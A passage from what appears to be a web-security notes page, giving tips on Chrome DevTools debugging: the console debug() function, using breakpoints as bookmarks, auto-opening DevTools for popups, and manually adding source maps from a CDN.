    {% endcode %}

    This `debug()` function isn't available by the source code, only via the DevTools Console, so you'll have to set a regular breakpoint at the start of a file and run the above manually if you want to detect calls that happen on load.

{% hint style="info" %}
**Tip**: ["Never pause breakpoints"](https://developer.chrome.com/docs/devtools/javascript/breakpoints/#never-pause-here) are useful for disabling specific lines triggering an event that you set a breakpoint on, as is their intention. At the same time you can also **use them as "bookmarks"** for lines of code to easily jump between, as you can click on any breakpoint in the top-right.
{% endhint %}

{% hint style="info" %}
**Tip**: In some cases you'll encounter a sort of Race Condition where a new tab/popup opens that you want to debug, but quickly pressing `Ctrl+Shift+I` is too late.\
To **automatically open DevTools** `window.open()` calls go to the ![](<../../.gitbook/assets/image (6).png>) Settings icon and under _Global_ check _Auto-open DevTools for popups_.
{% endhint %}

#### Source map from file

{% embed url="https://developer.chrome.com/docs/devtools/developer-resources#load" %}
DevTools documentation explaining manually loading source maps
{% endembed %}

Sometimes, [#source-maps](./#source-maps "mention") are not given to you by the application you are testing, but you can find one online from sources such as GitHub or a CDN. [As explained in my writeup](https://jorianwoltjer.com/blog/p/hacking/intigriti-xss-challenge/intigriti-january-xss-challenge-0124#debugging-minimized-javascript-libraries), Chrome allows you to manually add a source map to a JavaScript file from another URL.

Right-click anywhere inside the minified source code, then press _Add source map..._ and enter the absolute URL where the `.map` file can be found.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="443"><figcaption><p>Adding <code>axios</code> source map from CDN</p></figcaption></figure>

{% hint style="warning" %}
**Note**: After _reloading_, the source map will be lost. You will need to re-add the source map like explained above to see the sources.
{% endhint %}
